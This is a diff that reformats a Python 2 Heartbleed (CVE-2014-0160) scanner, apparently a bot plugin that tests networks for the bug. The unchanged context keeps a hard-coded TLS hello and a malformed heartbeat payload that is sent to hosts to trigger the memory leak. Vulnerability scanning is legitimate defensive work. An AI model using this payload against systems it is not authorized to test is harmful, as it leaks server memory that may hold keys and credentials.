@@ -11,17 +11,19 @@
 
 # Usage example: python ssltest.py example.com
 from util import hook
-#import sys
+
+# import sys
 import struct
 import socket
 import time
 import select
-#import re
-#import netaddr
-#import json
-#import os
-#import datetime
-#import signal
+
+# import re
+# import netaddr
+# import json
+# import os
+# import datetime
+# import signal
 from optparse import OptionParser
 from collections import defaultdict
 
@@ -30,23 +32,66 @@ hosts_to_skip = []
 counter = defaultdict(int)
 
 
-options = OptionParser(usage='%prog <network> [network2] [network3] ...', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple domains')
-options.add_option('--input', '-i', dest="input_file", default=[], action="append", help="Optional input file of networks or ip addresses, one address per line")
+options = OptionParser(
+    usage='%prog <network> [network2] [network3] ...',
+    description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple domains',
+)
+options.add_option(
+    '--input',
+    '-i',
+    dest="input_file",
+    default=[],
+    action="append",
+    help="Optional input file of networks or ip addresses, one address per line",
+)
 options.add_option('--logfile', '-o', dest="log_file", default="results.txt", help="Optional logfile destination")
-options.add_option('--resume', dest="resume", action="store_true", default=False, help="Do not rescan hosts that are already in the logfile")
-options.add_option('--timeout', '-t', dest="timeout", default=5, help="How long to wait for remote host to respond before timing out")
+options.add_option(
+    '--resume',
+    dest="resume",
+    action="store_true",
+    default=False,
+    help="Do not rescan hosts that are already in the logfile",
+)
+options.add_option(
+    '--timeout', '-t', dest="timeout", default=5, help="How long to wait for remote host to respond before timing out"
+)
 options.add_option('--json', dest="json_file", default=None, help="Save data as json into this file")
-options.add_option('--only-vulnerable', dest="only_vulnerable", action="store_true", default=False, help="Only scan hosts that have been scanned before and were vulnerable")
-options.add_option('--only-unscanned', dest="only_unscanned", action="store_true", default=False, help="Only scan hosts that appear in the json file but have not been scanned")
-options.add_option('--summary', dest="summary", action="store_true", default=False, help="Useful with --json. Don't scan, just print old results")
-options.add_option('--verbose', dest="verbose", action="store_true", default=False, help="Print verbose information to screen")
-options.add_option('--max', dest="max", default=None, help="Exit program after scanning X hosts. Useful with --only-unscanned")
+options.add_option(
+    '--only-vulnerable',
+    dest="only_vulnerable",
+    action="store_true",
+    default=False,
+    help="Only scan hosts that have been scanned before and were vulnerable",
+)
+options.add_option(
+    '--only-unscanned',
+    dest="only_unscanned",
+    action="store_true",
+    default=False,
+    help="Only scan hosts that appear in the json file but have not been scanned",
+)
+options.add_option(
+    '--summary',
+    dest="summary",
+    action="store_true",
+    default=False,
+    help="Useful with --json. Don't scan, just print old results",
+)
+options.add_option(
+    '--verbose', dest="verbose", action="store_true", default=False, help="Print verbose information to screen"
+)
+options.add_option(
+    '--max', dest="max", default=None, help="Exit program after scanning X hosts. Useful with --only-unscanned"
+)
 opts, args = options.parse_args()
+
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
-hello = h2bin('''
+
+hello = h2bin(
+    '''
 16 03 02 00  dc 01 00 00 d8 03 02 53
 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
 bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
@@ -62,9 +107,10 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
 00 0f 00 01 01                                  
-''')
+'''
+)
 
-hb = "\x18\x03\x02N#\x01N " + "\x01"*20000
+hb = "\x18\x03\x02N#\x01N " + "\x01" * 20000
 
 
 def recvall(s, length, timeout=5):
@@ -143,6 +189,7 @@ def is_vulnerable(host, timeout):
     s.send(hb)
     return hit_hb(s)
 
+
 def store_results(host_name, current_status):
     current_time = time.time()
 
@@ -163,10 +210,11 @@ def store_results(host_name, current_status):
         changelog_entry = [current_time, current_status]
         host['changelog'].append(changelog_entry)
     host['status'] = current_status
-    #with open(opts.log_file, 'a') as f:
+    # with open(opts.log_file, 'a') as f:
     message = "{current_time} {host} {current_status}".format(**locals())
-        # f.write(message + "\n")
+    # f.write(message + "\n")
     return message
+
 
 def scan_host(host):
     """ Scans a single host, logs into
@@ -177,7 +225,8 @@ def scan_host(host):
     host = str(host)
     result = is_vulnerable(host, opts.timeout)
     message = store_results(host, result)
-    if opts.verbose: print message
+    if opts.verbose:
+        print message
     return message
 
 
